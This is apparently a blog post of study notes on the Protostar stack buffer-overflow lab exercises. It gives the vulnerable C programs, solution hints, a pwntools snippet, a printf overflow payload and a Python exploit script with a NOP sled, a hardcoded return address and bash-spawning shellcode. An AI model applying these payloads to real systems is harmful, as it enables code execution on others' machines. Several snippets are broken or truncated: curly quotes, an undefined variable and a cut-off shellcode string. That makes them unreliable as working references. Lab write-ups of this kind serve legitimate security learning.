---
layout: post
title: >
    Protostar Stack Exploitation 0-4
tags: [exploit education, exploit, protostar, stack]
---

# PROTOSTAR

# Stack 0

```
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

this can be solved by normally overflowing the buffer with 68 A
NOTE:  apply breakpoint before the cmp or test statement so that you can calculate offset without segmentation fault

> from pwn import *
sh=process(’stack0’)
sh.recvline(timeout=5)
sh.send(b’A’*68)
c.recv()
> 

# Stack 01

```
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

after 64 offset the modified variable value i there you can recheck with the using the address shown there in gdb,

|NOTE binary is LSB so last bit first

# Stack 2

```
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

To inject payload you can also use printf “<payload>” as manually exploit no use to write python code. 

# Stack 3

```
void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

You need to change the value of fp to the win address, 

> Note: Volatile is **a qualifier that is applied to a variable when it is declared**. It tells the compiler that the value of the variable may change at any time-without any action being taken by the code the compiler finds nearby.
> 

# Stack 4

```
void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

for this type, find the crash point, then find the function add and add it after the crash point

# Stack 5 (Concepts)

```python
import struct
nop= 'A'*76
sp=struct.pack("I",0xbffff7c0)
#sh="\xde\xf7\xff\xbf"
padding="\x90"*200# +"\xcc"*4
shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69$
payload=nop+sp+padding+shellcode
print payload
```

First find the offset for the stack by segmentation fault and find the ebp by **x/2wx $ebp**, and the second one is the address of ebp as first line in gdb **push ebp** so it pushes the ebp in the stack the over the any value(garbage). because it moves to next  memory before pushing ebp.

**Explaining Exploit:-**

The offset is used to get to the eip and after marking the breakpoint to the last (main+27) and countinue forward(add \xcc [call to interrupt procedure ] so it overflow address after return address[which should be change to the int 3(\xcc) address ]) and overflow the return addresss with the address \xcc is. After the trap message appear , you can add shellcode instead of \xcc adding nop side(\x90) 

# Stack 6

```python
printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\xbf" | ./stack6
```

first find the value of return and changed it with the hard coded value, 

> Note : find the value same as value of return and try to over write that (Yet to research on that)
> 

`__builtin_return_address(0);` gives the return address for the function

# Stack 7

Same as previous, except the value to overwrite changed to 0xb0000000